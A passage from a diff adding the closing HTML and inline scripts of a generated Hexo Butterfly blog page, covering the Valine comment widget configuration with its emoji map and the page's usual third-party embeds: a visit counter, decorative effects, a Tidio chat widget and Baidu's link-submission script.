+      emojiMaps: {"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_亲亲":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_偷笑":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_再见":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_冷漠":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_发怒":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_发财":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_可爱":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_吐血":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_呆":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_呕吐":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_困":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_坏笑":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_大佬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_大哭":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_委屈":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_害羞":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_尴尬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_微笑":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_思考":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_惊吓":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png"},
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/js/third-party/switch_comments.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><script src="//code.tidio.co/cqinyzbakrsti8bz4wjlaffn3gkjplgj.js" async="async"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
